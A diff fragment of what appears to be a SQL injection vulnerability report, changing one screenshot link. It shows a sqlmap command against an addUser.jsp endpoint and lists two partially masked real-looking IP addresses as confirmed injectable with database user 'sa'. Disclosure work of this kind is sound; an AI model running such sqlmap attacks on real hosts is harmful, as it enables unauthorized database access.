@@ -30,7 +30,7 @@ sqlmap -u "http://Target IP:9090/security/addUser.jsp?******" --risk=3 --level=5
 ## Verified Cases
 1. **Case 1**: `http://125.91.119.**:9090`
     - sqlmap confirms the vulnerability, user is `sa`![](https://cdn.nlark.com/yuque/0/2025/png/40663643/1741592447335-d19640f8-dcfa-4045-91c3-651a9de47257.png)
-    - Asset Proof ![](https://cdn.nlark.com/yuque/0/2025/png/40663643/1741595668434-099dd824-c177-446a-b6a5-8e2358b77bb2.png)
+    - Asset Proof ![](https://cdn.nlark.com/yuque/0/2025/png/40663643/1741595734826-63e1b0c3-7ec3-41fa-9858-ebc94c9c4814.png)
 2. **Case 2**: `http://218.22.206.**:9090`
     - sqlmap confirms the vulnerability, user is `sa`![](https://cdn.nlark.com/yuque/0/2025/png/40663643/1741592646507-14ed52d0-bd09-4743-bb67-60df60e76fe8.png)
     - Asset Proof ![](https://cdn.nlark.com/yuque/0/2025/png/40663643/1741592702286-0cd01c6c-1c7a-4226-a3c7-67c0a4ba95a4.png)
